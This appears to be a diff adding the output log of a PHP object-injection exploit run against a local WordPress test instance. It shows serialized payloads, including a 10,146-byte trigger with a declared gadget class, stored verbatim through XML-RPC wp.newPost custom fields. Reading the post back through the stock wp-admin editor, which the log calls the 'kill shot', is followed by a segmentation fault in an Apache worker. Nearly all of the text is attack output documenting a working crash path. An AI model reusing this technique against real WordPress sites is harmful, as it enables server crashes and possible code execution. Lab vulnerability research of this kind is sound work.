@@ -1,0 +1,48 @@
+======================================================================
+shape34 mission 3 — zero4 through real WordPress HTTP
+target http://127.0.0.1:8083
+======================================================================
+[login] True
+
+--- A1: core surface storage via XML-RPC wp.newPost custom_fields
+[A1] wp.newPost status=200 post_id=11
+[A1] raw DB rows (maybe_serialize stored VERBATIM because is_serialized()):
+3	shape34_str	51	s:43:"s:37:"SHAPE34-CORE-SURFACE-PROOF-aabbccdd";";
+4	shape34_obj	51	s:43:"O:8:"stdClass":1:{s:3:"pkt";s:7:"SHAPE34";}";
+5	shape34_dead	10156	s:10145:"a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:6;i:1;i:7;i:1;i:8;i:1;i:9;i:1;i:10;i:1;i:11
+9	shape34_live	10157	s:10146:"a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:6;i:1;i:7;i:1;i:8;i:1;i:9;i:1;i:10;i:1;i:11
+13	shape34_str	51	s:43:"s:37:"SHAPE34-CORE-SURFACE-PROOF-aabbccdd";";
+14	shape34_obj	51	s:43:"O:8:"stdClass":1:{s:3:"pkt";s:7:"SHAPE34";}";
+15	shape34_dead	10156	s:10145:"a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:6;i:1;i:7;i:1;i:8;i:1;i:9;i:1;i:10;i:1;i:11
+
+--- A2: core surface read-back via wp-admin editor render
+[A2] editor GET (metabox list_meta -> maybe_unserialize on every row):
+     status=200 dt=0.20s len=725018 body[:160]='<!DOCTYPE html>\n<html class="wp-toolbar"\n\tlang="en-US">\n<head>\n<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />\n\t<title>Edit Post &#8220;sh'
+[A2] string-marker unserialized-and-rendered in metabox: False
+[A2] object row present-but-skipped (is_serialized_string false): True
+
+--- B1: plugin-level surface control (benign payload)
+     status=200 dt=0.02s len=61 body[:160]='"[shape34-import] PHP 8.3.36 sapi=apache2handler result=true"'
+
+--- B2: plugin-level surface, exact zero4 trigger over HTTP POST
+     trigger bytes: 10146, class O:18:"Shape34_JobEnvelope"
+     TRANSPORT-FAIL dt=0.03s RemoteDisconnected: Remote end closed connection without response
+
+--- A3: CORE surface + declared gadget class = trigger stored in DB,
+          read through STOCK wp-admin (the plugin only declares the class)
+[A3] wp.newPost status=200 post_id=13
+3	shape34_str	51	s:43:"s:37:"SHAPE34-CORE-SURFACE-PROOF-aabbccdd";";
+4	shape34_obj	51	s:43:"O:8:"stdClass":1:{s:3:"pkt";s:7:"SHAPE34";}";
+5	shape34_dead	10156	s:10145:"a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:6;i:1;i:7;i:1;i:8;i:1;i:9;i:1;i:10;i:1;i:11
+9	shape34_live	10157	s:10146:"a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:6;i:1;i:7;i:1;i:8;i:1;i:9;i:1;i:10;i:1;i:11
+13	shape34_str	51	s:43:"s:37:"SHAPE34-CORE-SURFACE-PROOF-aabbccdd";";
+14	shape34_obj	51	s:43:"O:8:"stdClass":1:{s:3:"pkt";s:7:"SHAPE34";}";
+15	shape34_dead	10156	s:10145:"a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:6;i:1;i:7;i:1;i:8;i:1;i:9;i:1;i:10;i:1;i:11
+19	shape34_live	10157	s:10146:"a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:6;i:1;i:7;i:1;i:8;i:1;i:9;i:1;i:10;i:1;i:11
+[A3] editor read (the kill shot on glibc workers):
+     status=200 dt=0.20s len=725018 body[:160]='<!DOCTYPE html>\n<html class="wp-toolbar"\n\tlang="en-US">\n<head>\n<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />\n\t<title>Edit Post &#8220;sh'
+
+--- manifests: apache child kill lines (last 120s)
+     [Sat Oct 24 20:21:14.939814 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 63 exit signal Segmentation fault (11)
+
+DONE shape34_wp_fire
